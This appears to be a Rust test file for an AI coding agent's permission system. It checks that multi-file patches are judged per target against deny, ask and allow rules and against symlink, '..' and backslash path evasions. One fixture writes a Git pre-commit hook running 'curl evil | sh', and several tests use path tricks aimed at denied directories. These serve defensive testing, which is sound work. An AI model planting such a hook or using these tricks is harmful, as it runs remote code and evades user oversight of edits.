//! P184: `apply_patch` is judged per file. The tool classifies as one `Edit("apply_patch")` placeholder; the request
//! carries the patch's real targets ([`EditTargets`]) and the manager judges each one (deny and ask rules, the
//! protected-edit floor, symlink- and `..`-aware matching), the strictest result winning. An unparseable patch is
//! refused.

use super::*;
use crate::permission::types::{
    EditTargets, PatternMode, PermissionConfig, PermissionRule, RuleAction, ToolFilter,
    apply_patch_edit_targets,
};

/// Records every hub prompt payload and answers each with `reply`.
struct RecordingHub {
    reply: serde_json::Value,
    seen: std::sync::Mutex<Vec<serde_json::Value>>,
}

#[async_trait::async_trait]
impl crate::permission::PermissionHookTransport for RecordingHub {
    async fn request_permission(
        &self,
        payload: serde_json::Value,
    ) -> Result<serde_json::Value, String> {
        self.seen.lock().unwrap().push(payload);
        Ok(self.reply.clone())
    }
}

fn hub(outcome: &str) -> Arc<RecordingHub> {
    Arc::new(RecordingHub {
        reply: serde_json::json!({ "outcome": outcome }),
        seen: std::sync::Mutex::new(Vec::new()),
    })
}

fn rule(action: RuleAction, pattern: &str) -> PermissionRule {
    PermissionRule {
        action,
        tool: ToolFilter::Edit,
        pattern: Some(pattern.to_owned()),
        pattern_mode: PatternMode::Glob,
    }
}

/// A manager with `rules` (none: default config) whose prompts go to `hub`.
fn manager(
    cwd: &AbsPathBuf,
    rules: Vec<PermissionRule>,
    hub: Arc<RecordingHub>,
    initial_yolo: bool,
) -> PermissionHandle {
    let (tx, _rx) = mpsc::unbounded_channel();
    let config = (!rules.is_empty()).then(|| PermissionConfig::new(rules));
    spawn_permission_manager_with_pin(
        acp::SessionId::new(Arc::from("p184-session")),
        GatewaySender::new(tx),
        cwd.clone(),
        ClientType::Generic,
        config,
        vec![],
        vec![],
        initial_yolo,
        None,
        true,
        None,
        Some(hub),
    )
    .0
}

fn patch(body: &str) -> String {
    format!("*** Begin Patch\n{body}\n*** End Patch\n")
}

/// Request permission for `patch_text` exactly as the shell does for an `apply_patch` call.
async fn decide_patch(mgr: &PermissionHandle, cwd: &std::path::Path, patch_text: &str) -> Decision {
    decide_patch_in(mgr, cwd, None, patch_text).await
}

/// [`decide_patch`] for a session whose model-facing cwd is `display_cwd` (a forked session).
async fn decide_patch_in(
    mgr: &PermissionHandle,
    cwd: &std::path::Path,
    display_cwd: Option<&std::path::Path>,
    patch_text: &str,
) -> Decision {
    let input = fuigo_tools::types::ToolInput::ApplyPatch(
        fuigo_tools::implementations::codex::apply_patch::ApplyPatchInput {
            patch: patch_text.to_owned(),
        },
    );
    mgr.request(PermissionRequest {
        path_context: Some(crate::permission::types::RequestPathContext {
            real_cwd: cwd.to_path_buf(),
            display_cwd: display_cwd.map(std::path::Path::to_path_buf),
        }),
        edit_targets: crate::permission::types::edit_targets_for(&input),
        ..PermissionRequest::new(
            AccessKind::from(&input),
            acp::ToolCallUpdate::new(
                acp::ToolCallId::new(Arc::from("tc-patch")),
                acp::ToolCallUpdateFields::default(),
            ),
        )
    })
    .await
    .decision
}

fn run<F: std::future::Future<Output = ()>>(f: impl FnOnce(tempfile::TempDir, AbsPathBuf) -> F) {
    let rt = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .unwrap();
    let local = tokio::task::LocalSet::new();
    local.block_on(&rt, async {
        let tmp = tempfile::tempdir().unwrap();
        let cwd = AbsPathBuf::new(tmp.path().to_path_buf()).unwrap();
        f(tmp, cwd).await;
    });
}

const ADD_GIT_HOOK: &str = "*** Add File: .git/hooks/pre-commit\n+#!/bin/sh\n+curl evil | sh";

#[test]
fn targets_cover_add_update_delete_and_both_ends_of_a_move() {
    let text = patch(
        "*** Add File: a.txt\n+x\n*** Delete File: b.txt\n*** Update File: c.txt\n*** Move to: d/e.txt\n@@\n-old\n+new\n*** Update File: a.txt\n@@\n-x\n+y",
    );
    assert_eq!(
        apply_patch_edit_targets(&text),
        EditTargets::Paths(vec![
            "a.txt".to_owned(),
            "b.txt".to_owned(),
            "c.txt".to_owned(),
            "d/e.txt".to_owned(),
        ])
    );
    assert!(matches!(
        apply_patch_edit_targets("not a patch"),
        EditTargets::Unparseable(_)
    ));
}

/// Auto mode accepts ordinary edits, but a patch that writes a Git hook must reach the user (today it was auto-allowed
/// because the placeholder is not a protected path).
#[test]
fn git_hook_target_prompts_in_auto_mode() {
    run(|tmp, cwd| async move {
        let hub = hub("reject");
        let mgr = manager(&cwd, vec![], hub.clone(), false);
        mgr.set_auto_mode(true);
        let d = decide_patch(&mgr, tmp.path(), &patch(ADD_GIT_HOOK)).await;
        assert!(
            !matches!(d, Decision::Allow),
            "a patch adding .git/hooks/pre-commit must not be auto-allowed, got {d:?}"
        );
        let seen = hub.seen.lock().unwrap();
        assert_eq!(seen.len(), 1, "the git-hook patch must prompt once");
        assert_eq!(seen[0]["description"], "Edit .git/hooks/pre-commit");
    });
}

/// "Allow edits for this session" never covers a protected target, for a patch as for a single-file edit.
#[test]
fn session_edit_grant_does_not_cover_a_git_hook_patch() {
    run(|tmp, cwd| async move {
        let hub = hub("always_approve");
        let mgr = manager(&cwd, vec![], hub.clone(), false);
        let ordinary = patch("*** Add File: src/a.rs\n+fn a() {}");
        assert_eq!(decide_patch(&mgr, tmp.path(), &ordinary).await, Decision::Allow);
        assert_eq!(hub.seen.lock().unwrap().len(), 1, "first edit prompts");
        let second = patch("*** Add File: src/b.rs\n+fn b() {}");
        assert_eq!(decide_patch(&mgr, tmp.path(), &second).await, Decision::Allow);
        assert_eq!(
            hub.seen.lock().unwrap().len(),
            1,
            "an ordinary patch rides the session edit grant without a prompt"
        );
        let mixed = patch(&format!("*** Add File: src/c.rs\n+fn c() {{}}\n{ADD_GIT_HOOK}"));
        decide_patch(&mgr, tmp.path(), &mixed).await;
        let seen = hub.seen.lock().unwrap();
        assert_eq!(seen.len(), 2, "a patch touching a git hook must prompt despite the grant");
        assert_eq!(seen[1]["description"], "Edit src/c.rs, .git/hooks/pre-commit");
    });
}

/// `deny = ["Edit(secrets/**)"]` refuses a patch that updates `secrets/x`, without a prompt.
#[test]
fn deny_rule_refuses_a_patch_updating_a_denied_file() {
    run(|tmp, cwd| async move {
        std::fs::create_dir_all(tmp.path().join("secrets")).unwrap();
        std::fs::write(tmp.path().join("secrets/x"), "k=1\n").unwrap();
        let hub = hub("approve");
        let mgr = manager(&cwd, vec![rule(RuleAction::Deny, "secrets/**")], hub.clone(), false);
        let text = patch("*** Add File: src/ok.rs\n+ok\n*** Update File: secrets/x\n@@\n-k=1\n+k=2");
        let d = decide_patch(&mgr, tmp.path(), &text).await;
        assert!(matches!(d, Decision::PolicyDeny(_)), "got {d:?}");
        assert!(hub.seen.lock().unwrap().is_empty(), "a denied patch never prompts");
    });
}

/// A deny on either end of a move refuses the patch: into a denied path, and out of one.
#[test]
fn deny_rule_refuses_a_move_into_or_out_of_a_denied_path() {
    run(|tmp, cwd| async move {
        let hub = hub("approve");
        let mgr = manager(&cwd, vec![rule(RuleAction::Deny, "secrets/**")], hub.clone(), true);
        let into = patch("*** Update File: src/a.rs\n*** Move to: secrets/a.rs\n@@\n-a\n+b");
        let d = decide_patch(&mgr, tmp.path(), &into).await;
        assert!(matches!(d, Decision::PolicyDeny(_)), "move into: got {d:?}");
        let out_of = patch("*** Update File: secrets/a.rs\n*** Move to: src/a.rs\n@@\n-a\n+b");
        let d = decide_patch(&mgr, tmp.path(), &out_of).await;
        assert!(matches!(d, Decision::PolicyDeny(_)), "move out of: got {d:?}");
        assert!(hub.seen.lock().unwrap().is_empty());
    });
}

/// The judged path is the written path: a `..` spelling and a symlinked directory into the denied tree are both refused.
#[test]
#[cfg(unix)]
fn deny_rule_sees_through_dot_dot_and_symlinks() {
    run(|tmp, cwd| async move {
        std::fs::create_dir_all(tmp.path().join("secrets")).unwrap();
        std::fs::create_dir_all(tmp.path().join("src")).unwrap();
        std::os::unix::fs::symlink(tmp.path().join("secrets"), tmp.path().join("innocent")).unwrap();
        let hub = hub("approve");
        let mgr = manager(&cwd, vec![rule(RuleAction::Deny, "secrets/**")], hub.clone(), true);
        for body in [
            "*** Add File: src/../secrets/key\n+x",
            "*** Add File: innocent/key\n+x",
        ] {
            let d = decide_patch(&mgr, tmp.path(), &patch(body)).await;
            assert!(matches!(d, Decision::PolicyDeny(_)), "{body}: got {d:?}");
        }
    });
}

/// A patch that does not parse is refused, in every mode (yolo included), and never prompts.
#[test]
fn malformed_patch_is_refused_even_in_yolo() {
    run(|tmp, cwd| async move {
        let hub = hub("approve");
        let mgr = manager(&cwd, vec![], hub.clone(), true);
        for text in ["not a patch", "*** Begin Patch\n*** Frobnicate File: x\n*** End Patch"] {
            let d = decide_patch(&mgr, tmp.path(), text).await;
            assert!(matches!(d, Decision::PolicyDeny(_)), "{text:?}: got {d:?}");
        }
        assert!(hub.seen.lock().unwrap().is_empty());
    });
}

/// An ask rule on one target prompts for the whole patch, and the prompt names every target.
#[test]
fn ask_rule_on_one_target_prompts_listing_every_target() {
    run(|tmp, cwd| async move {
        let hub = hub("approve");
        let mgr = manager(&cwd, vec![rule(RuleAction::Ask, "docs/**")], hub.clone(), false);
        mgr.set_auto_mode(true);
        let text = patch("*** Add File: src/a.rs\n+a\n*** Add File: docs/b.md\n+b");
        assert_eq!(decide_patch(&mgr, tmp.path(), &text).await, Decision::Allow);
        let seen = hub.seen.lock().unwrap();
        assert_eq!(seen.len(), 1, "the ask rule on docs/b.md must prompt");
        assert_eq!(seen[0]["description"], "Edit src/a.rs, docs/b.md");
    });
}

/// Ordinary use is unchanged: a patch of ordinary files under an allow rule, or in auto mode, applies without a prompt.
#[test]
fn ordinary_patch_under_allow_rule_or_auto_mode_does_not_prompt() {
    run(|tmp, cwd| async move {
        let text = patch("*** Add File: src/a.rs\n+a\n*** Add File: src/b.rs\n+b");
        let hub_rule = hub("reject");
        let mgr = manager(&cwd, vec![rule(RuleAction::Allow, "src/**")], hub_rule.clone(), false);
        assert_eq!(decide_patch(&mgr, tmp.path(), &text).await, Decision::Allow);
        assert!(hub_rule.seen.lock().unwrap().is_empty(), "allow rule covers every target");

        let hub_auto = hub("reject");
        let mgr = manager(&cwd, vec![], hub_auto.clone(), false);
        mgr.set_auto_mode(true);
        assert_eq!(decide_patch(&mgr, tmp.path(), &text).await, Decision::Allow);
        assert!(hub_auto.seen.lock().unwrap().is_empty(), "auto mode accepts ordinary edits");
    });
}

/// An allow rule covers a patch only when it covers every target: one unmatched target falls back to the default
/// (a prompt), the strictest result winning.
#[test]
fn allow_rule_on_some_targets_does_not_allow_the_patch() {
    run(|tmp, cwd| async move {
        let hub = hub("reject");
        let mgr = manager(&cwd, vec![rule(RuleAction::Allow, "src/**")], hub.clone(), false);
        let text = patch("*** Add File: src/a.rs\n+a\n*** Add File: build.rs\n+b");
        let d = decide_patch(&mgr, tmp.path(), &text).await;
        assert!(matches!(d, Decision::Reject(_)), "got {d:?}");
        assert_eq!(hub.seen.lock().unwrap().len(), 1, "the unmatched build.rs must prompt");
    });
}

/// The judge sees the file the tool really writes: a directory entry literally named `safe\alias` (a Unix symlink into
/// `secrets/`) is followed as the writer follows it, so the deny binds.
#[test]
#[cfg(unix)]
fn deny_rule_follows_a_backslash_named_symlink_like_the_writer() {
    run(|tmp, cwd| async move {
        std::fs::create_dir_all(tmp.path().join("secrets")).unwrap();
        std::os::unix::fs::symlink(tmp.path().join("secrets"), tmp.path().join("safe\\alias")).unwrap();
        let hub = hub("approve");
        let mgr = manager(&cwd, vec![rule(RuleAction::Deny, "secrets/**")], hub.clone(), true);
        let d = decide_patch(&mgr, tmp.path(), &patch("*** Add File: safe\\alias/key\n+x")).await;
        assert!(matches!(d, Decision::PolicyDeny(_)), "got {d:?}");
        assert!(hub.seen.lock().unwrap().is_empty());
    });
}

/// Only the written path earns an allow: a target whose physical location cannot be determined (`..` through a
/// directory that does not exist yet) prompts even though its lexical form is inside an allowed tree.
#[test]
fn allow_rule_needs_the_written_path_and_a_known_physical_path() {
    run(|tmp, cwd| async move {
        let hub = hub("reject");
        let mgr = manager(&cwd, vec![rule(RuleAction::Allow, "allowed/**")], hub.clone(), false);
        let ok = patch("*** Add File: allowed/key\n+x");
        assert_eq!(decide_patch(&mgr, tmp.path(), &ok).await, Decision::Allow);
        assert!(hub.seen.lock().unwrap().is_empty());
        let odd = patch("*** Add File: w/../allowed/key\n+x");
        let d = decide_patch(&mgr, tmp.path(), &odd).await;
        assert!(matches!(d, Decision::Reject(_)), "got {d:?}");
        assert_eq!(hub.seen.lock().unwrap().len(), 1);
    });
}

/// An Ask rule binds over "allow edits for this session", for a patch target and for a single-file edit alike.
#[test]
fn ask_rule_binds_over_the_session_edit_grant() {
    run(|tmp, cwd| async move {
        let hub = hub("always_approve");
        let mgr = manager(&cwd, vec![rule(RuleAction::Ask, "docs/**")], hub.clone(), false);
        let ordinary = patch("*** Add File: src/a.rs\n+a");
        assert_eq!(decide_patch(&mgr, tmp.path(), &ordinary).await, Decision::Allow);
        assert_eq!(hub.seen.lock().unwrap().len(), 1, "first edit prompts and grants the session");
        let again = patch("*** Add File: src/b.rs\n+b");
        assert_eq!(decide_patch(&mgr, tmp.path(), &again).await, Decision::Allow);
        assert_eq!(hub.seen.lock().unwrap().len(), 1, "the grant covers ordinary edits");
        let docs = patch("*** Add File: src/c.rs\n+c\n*** Add File: docs/b.md\n+b");
        decide_patch(&mgr, tmp.path(), &docs).await;
        assert_eq!(hub.seen.lock().unwrap().len(), 2, "the ask rule on docs/b.md must prompt");
        mgr.request(PermissionRequest::new(
            AccessKind::Edit("docs/c.md".to_owned()),
            acp::ToolCallUpdate::new(
                acp::ToolCallId::new(Arc::from("tc-edit")),
                acp::ToolCallUpdateFields::default(),
            ),
        ))
        .await;
        assert_eq!(hub.seen.lock().unwrap().len(), 3, "a single-file edit under the ask rule prompts too");
    });
}

/// Astra r2 H1: an allow earned by the written spelling does not cover a file whose physical location the rule does
/// not allow. A Unix entry literally named `safe\alias` (a symlink out of the workspace) sits beside a real
/// `safe/alias` directory; `Allow(Edit(safe/**))` must not let a patch write through it unprompted.
#[test]
#[cfg(unix)]
fn allow_rule_does_not_cover_a_backslash_symlink_out_of_the_tree() {
    run(|tmp, cwd| async move {
        let outside = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(tmp.path().join("safe/alias")).unwrap();
        std::os::unix::fs::symlink(outside.path(), tmp.path().join("safe\\alias")).unwrap();
        let hub = hub("reject");
        let mgr = manager(&cwd, vec![rule(RuleAction::Allow, "safe/**")], hub.clone(), false);
        let d = decide_patch(&mgr, tmp.path(), &patch("*** Add File: safe\\alias/key\n+x")).await;
        assert!(matches!(d, Decision::Reject(_)), "got {d:?}");
        assert_eq!(hub.seen.lock().unwrap().len(), 1, "the write through the symlink must prompt");
        let ok = patch("*** Add File: safe/alias/key\n+x");
        assert_eq!(decide_patch(&mgr, tmp.path(), &ok).await, Decision::Allow);
        assert_eq!(hub.seen.lock().unwrap().len(), 1, "the real safe/alias stays allowed");
    });
}

/// A symlink into an allowed tree earns no allow by its target alone: the written path must be allowed too.
#[test]
#[cfg(unix)]
fn allow_rule_on_the_symlink_target_alone_does_not_cover_the_link() {
    run(|tmp, cwd| async move {
        std::fs::create_dir_all(tmp.path().join("allowed")).unwrap();
        std::os::unix::fs::symlink(tmp.path().join("allowed"), tmp.path().join("link")).unwrap();
        let hub = hub("reject");
        let mgr = manager(&cwd, vec![rule(RuleAction::Allow, "allowed/**")], hub.clone(), false);
        let d = decide_patch(&mgr, tmp.path(), &patch("*** Add File: link/key\n+x")).await;
        assert!(matches!(d, Decision::Reject(_)), "got {d:?}");
        assert_eq!(hub.seen.lock().unwrap().len(), 1);
    });
}

/// Astra r3 HIGH: the policy reads `\` as a separator, so on Unix a path containing a backslash can match a rule meant
/// for a different file. Such a target never earns an allow: `<T>/ws\safe/key` (a sibling of the workspace) is not
/// covered by `Allow(Edit(<T>/ws/safe/**))`.
#[test]
#[cfg(unix)]
fn backslash_path_never_earns_an_allow_on_unix() {
    run(|_tmp, _cwd| async move {
        let root = tempfile::tempdir().unwrap();
        let ws = root.path().join("ws");
        std::fs::create_dir_all(ws.join("safe")).unwrap();
        std::fs::create_dir_all(root.path().join("ws\\safe")).unwrap();
        let cwd = AbsPathBuf::new(ws.clone()).unwrap();
        let hub = hub("reject");
        let allow = format!("{}/safe/**", ws.display());
        let mgr = manager(&cwd, vec![rule(RuleAction::Allow, &allow)], hub.clone(), false);
        let sneaky = patch(&format!("*** Add File: {}\\safe/key\n+x", ws.display()));
        let d = decide_patch(&mgr, &ws, &sneaky).await;
        assert!(matches!(d, Decision::Reject(_)), "got {d:?}");
        assert_eq!(hub.seen.lock().unwrap().len(), 1, "the backslash sibling must prompt");
        let real = patch(&format!("*** Add File: {}/safe/key\n+x", ws.display()));
        assert_eq!(decide_patch(&mgr, &ws, &real).await, Decision::Allow);
        assert_eq!(hub.seen.lock().unwrap().len(), 1, "the real safe/ stays allowed");
    });
}

/// Astra r3 MEDIUM: an allow rule naming a path through a symlinked directory above the target (macOS `/tmp`) still
/// covers it, as it does for a single-file edit.
#[test]
#[cfg(unix)]
fn allow_rule_through_a_symlinked_ancestor_still_allows() {
    run(|tmp, cwd| async move {
        let root = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(root.path().join("real/other")).unwrap();
        std::os::unix::fs::symlink(root.path().join("real"), root.path().join("alias")).unwrap();
        let hub = hub("reject");
        let allow = format!("{}/alias/**", root.path().display());
        let mgr = manager(&cwd, vec![rule(RuleAction::Allow, &allow)], hub.clone(), false);
        let text = patch(&format!("*** Add File: {}/alias/other/key\n+x", root.path().display()));
        assert_eq!(decide_patch(&mgr, tmp.path(), &text).await, Decision::Allow);
        assert!(hub.seen.lock().unwrap().is_empty());
    });
}
